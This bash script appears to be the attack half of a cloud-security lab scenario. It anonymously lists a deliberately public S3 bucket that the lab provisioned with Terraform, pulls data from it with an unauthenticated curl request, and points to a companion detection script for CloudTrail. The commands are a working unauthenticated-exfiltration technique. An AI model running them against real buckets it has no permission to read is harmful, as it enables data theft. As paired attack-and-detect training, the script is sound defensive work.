#!/usr/bin/env bash
# Scenario 01 — S3 Data Exfiltration :: ATTACK
#
# Demonstrates that the scenario's public bucket can be read and
# exfiltrated with NO AWS credentials whatsoever. Two independent proofs:
#   1. Anonymous S3 API listing  (aws --no-sign-request)
#   2. Unauthenticated HTTPS GET (curl, no auth headers at all)
#
# Reads the target from Terraform outputs so it never hardcodes a bucket
# name. Run from anywhere; it locates the terraform dir relative to itself.
set -euo pipefail

TF_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/../terraform" && pwd)"

BUCKET="$(terraform -chdir="$TF_DIR" output -raw data_bucket_name)"
URL="$(terraform -chdir="$TF_DIR" output -raw data_bucket_public_url_example)"

echo "[*] Target bucket: $BUCKET"
echo "[*] Attack start (UTC): $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo

echo "=== STEP 1: anonymous bucket listing (no credentials) ==="
aws s3 ls "s3://${BUCKET}/" --recursive --no-sign-request

echo
echo "=== STEP 2: unauthenticated exfiltration via HTTPS GET ==="
curl -fsS -w "\n[HTTP %{http_code}] %{size_download} bytes exfiltrated\n" "$URL"

echo
echo "[*] Attack complete. CloudTrail S3 data events take ~5-15 min to"
echo "    deliver — run scripts/detect.sh after that window."
